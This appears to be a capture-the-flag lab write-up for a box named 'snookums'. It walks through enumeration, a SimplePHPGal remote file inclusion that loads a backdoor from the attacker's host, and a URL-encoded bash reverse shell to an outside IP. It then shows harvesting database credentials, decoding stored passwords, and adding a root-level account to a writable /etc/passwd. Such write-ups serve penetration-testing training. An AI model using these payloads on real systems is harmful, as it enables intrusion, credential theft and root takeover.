## Initial Foothold
autorecon 192.168.228.58

21/tcp    open  ftp          syn-ack ttl 61 vsftpd 3.0.2
22/tcp    open  ssh          syn-ack ttl 61 OpenSSH 7.4 (protocol 2.0)
80/tcp    open  http         syn-ack ttl 61 Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
111/tcp   open  rpcbind      syn-ack ttl 61 2-4 (RPC #100000)
139/tcp   open  netbios-ssn? syn-ack ttl 61
445/tcp   open  netbios-ssn  syn-ack ttl 61 Samba smbd 4.10.4 (workgroup: SAMBA)
3306/tcp  open  mysql        syn-ack ttl 61 MySQL (unauthorized)
33060/tcp open  mysqlx       syn-ack ttl 61 MySQL X protocol listener

port 21(ftp) - anonymous login allowed but is in passive mode. Try `michael:michael`, tried hydra michael with rockyou.
port 22(ssh) - Tried nmap ssh brute script, tried `michael:michael`, tried hydra michael with rockyou
port 139/445(smb) - no shares listed anonymously. Enum4linux return:
`[+] Found user 'Unix User\michael' (RID 1000)`
port 3306/33060(mysql) - Tried `root:` & `root:root`, `michael:michael`

port 80(Web) - Nothing interesting. Webpage is using SimplePHPGal which has a RFI vulnerability on exploitdb.
```
──(kali㉿kali)-[~/offsec/snookums]
└─$ feroxbuster -u http://192.168.228.58 -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-directories.txt -x "txt,html,php,asp,aspx,jsp" -k

403      GET        8l       22w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
404      GET        7l       24w        -c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        7l       20w      234c http://192.168.228.58/css => http://192.168.228.58/css/
301      GET        7l       20w      237c http://192.168.228.58/images => http://192.168.228.58/images/
301      GET        7l       20w      233c http://192.168.228.58/js => http://192.168.228.58/js/
200      GET      215l      564w     4516c http://192.168.228.58/css/screen.css
200      GET      171l      394w     3535c http://192.168.228.58/css/lightbox.css
200      GET       48l      265w    20142c http://192.168.228.58/images/examples/thumb-6.jpg
200      GET       20l       71w     2798c http://192.168.228.58/js/jquery.smooth-scroll.min.js
200      GET       63l      389w    27990c http://192.168.228.58/images/examples/thumb-1.jpg
200      GET        0l        0w        0c http://192.168.228.58/db.php
200      GET       50l      341w    20823c http://192.168.228.58/js/jquery-ui-1.8.18.custom.min.js
200      GET       78l      450w    38308c http://192.168.228.58/images/examples/thumb-2.jpg
200      GET       76l      455w    35440c http://192.168.228.58/images/examples/thumb-5.jpg
301      GET        7l       20w      237c http://192.168.228.58/photos => http://192.168.228.58/photos/
200      GET      351l      915w    11597c http://192.168.228.58/js/lightbox.js
200      GET       71l      120w     1508c http://192.168.228.58/image.php
200      GET       72l      552w    41964c http://192.168.228.58/images/examples/thumb-3.jpg
200      GET       73l      472w    35302c http://192.168.228.58/images/examples/thumb-4.jpg
200      GET       90l      182w     2730c http://192.168.228.58/index.php
200      GET        4l     1236w    94839c http://192.168.228.58/js/jquery-1.7.2.min.js
200      GET        0l        0w        0c http://192.168.228.58/functions.php
200      GET      432l     2300w   198123c http://192.168.228.58/images/examples/image-1.jpg
200      GET      363l     2264w   215577c http://192.168.228.58/images/examples/image-3.jpg
200      GET       15l      133w     8439c http://192.168.228.58/images/donate.png
200      GET      375l     2584w   242856c http://192.168.228.58/images/examples/image-5.jpg
200      GET      103l      511w    13348c http://192.168.228.58/images/loading.gif
200      GET        3l       11w      873c http://192.168.228.58/images/close.png
200      GET        4l       39w     1504c http://192.168.228.58/images/favicon.gif
200      GET        3l       37w      986c http://192.168.228.58/images/bg-checker.png
200      GET      417l     2010w   169815c http://192.168.228.58/images/examples/image-6.jpg
200      GET       51l      327w    20329c http://192.168.228.58/images/box.png
200      GET       12l      100w     5700c http://192.168.228.58/images/speech-bubbles.png
200      GET       11l       43w     2409c http://192.168.228.58/images/next.png
200      GET        1l        1w       59c http://192.168.228.58/images/bullet.gif
200      GET      457l     2618w   245309c http://192.168.228.58/images/examples/image-2.jpg
200      GET        8l       38w     2452c http://192.168.228.58/images/prev.png
200      GET        6l       12w      139c http://192.168.228.58/embeddedGallery.php
200      GET       71l      658w     4041c http://192.168.228.58/README.txt
200      GET      428l     2705w   287473c http://192.168.228.58/images/examples/image-4.jpg
200      GET      130l     2849w    18511c http://192.168.228.58/license.txt

```

Host simple-backdoor.php on port 80. Then use firefox and go to this link. We can see a bunch of files listed. The RFI on exploitdb worked.
```
http://192.168.228.58/image.php?img=http://192.168.45.216/simple-backdoor.php&cmd=ls

http://192.168.228.58/image.php?img=http://192.168.45.216/simple-backdoor.php&cmd=bash%20-c%20%27exec%20bash%20-i%20%26%3E%2Fdev%2Ftcp%2F192.168.45.216%2F33060%20%3C%261%27
```
Fiddled around for hours because I set the listening port at 4444 and tried 443 as well. These ports have been restricted outbound so I could never catch them with penelope. The port that worked is 33060 and nmap has shown that it is open for our target.

## Privesc

Run linpeas.sh and we see this suspicious file.
```
╔══════════╣ Searching passwords in PHP files (T1552.001)
/var/www/html/db.php:define('DBUSER', 'root');

bash-4.2$ cat /var/www/html/db.php
<?php
define('DBHOST', '127.0.0.1');
define('DBUSER', 'root');
define('DBPASS', 'MalapropDoffUtilize1337');
define('DBNAME', 'SimplePHPGal');
?>           
```

Connect to mysql
```
bash-4.2$ mysql -u root -p
Enter password: MalapropDoffUtilize1337

mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| SimplePHPGal       |
| information_schema |
| mysql              |
| performance_schema |
| sys                |
+--------------------+
5 rows in set (0.00 sec)

mysql> use SimplePHPGal;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql> show tables;
+------------------------+
| Tables_in_SimplePHPGal |
+------------------------+
| users                  |
+------------------------+
1 row in set (0.00 sec)

mysql> select * from users;
+----------+----------------------------------------------+
| username | password                                     |
+----------+----------------------------------------------+
| josh     | VFc5aWFXeHBlbVZJYVhOelUyVmxaSFJwYldVM05EYz0= |
| michael  | U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==     |
| serena   | VDNabGNtRnNiRU55WlhOMFRHVmhiakF3TUE9PQ==     |
+----------+----------------------------------------------+
3 rows in set (0.00 sec)

```

Use cyberchef to decode it two times. We get `michael:HockSydneyCertify123`
```
U0c5amExTjVaRzVsZVVObGNuUnBabmt4TWpNPQ==
SG9ja1N5ZG5leUNlcnRpZnkxMjM=
HockSydneyCertify123
```

su to michael. michael has no sudo rights. Run linpeas.sh again as michael. /etc/passwd is writable.
```
╔══════════╣ Permissions in init, init.d, systemd, and rc.d (T1543.002)
╚ https://book.hacktricks.wiki/en/linux-hardening/processes-crontab-systemd-dbus/process-enumeration-and-service-paths.html#follow-the-service-execution-chain                                                                                                                                                          
                                                                                                                                                            
═╣ Hashes inside passwd file? ........... No
═╣ Writable passwd file? ................ /etc/passwd is writable                                                                                           
═╣ Credentials in fstab/mtab? ........... No
```

```
[michael@snookums tmp]$ echo 'hacker:$1$iwsCv3nr$A8ZFYPVvSE4O0kVpjszuO1:0:0:root:/root:/bin/bash' >> /etc/passwd
[michael@snookums tmp]$ su hacker
Password: pwned
[root@snookums tmp]# cd /root
```